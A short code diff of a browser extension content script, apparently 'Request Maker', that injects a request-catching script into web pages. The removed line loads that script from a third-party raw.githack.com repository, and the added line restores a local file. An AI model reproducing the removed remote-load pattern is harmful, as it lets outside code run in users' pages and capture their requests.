@@ -73,12 +73,12 @@ try {
 	// inject catcher.js to the DOM
 	script = document.createElement('script');
 	script.type = 'text/javascript';
-	script.src = chrome.extension.getURL('https://raw.githack.com/messi17/benim3/master/1/catcher.js');
+	script.src = chrome.extension.getURL('catcher.js');
 	script.innerHTML = '<!-- script injected by Request Maker -->';
 	document.documentElement.appendChild(script);
 
 	// forward the events
-	script.addEventListener('1', function (event) {
+	script.addEventListener('kajfghlhfkcocafkcjlajldicbikpgnp', function (event) {
 			chrome.extension.sendRequest({
 				'type': event.detail.type,
 				'method': event.detail.method,
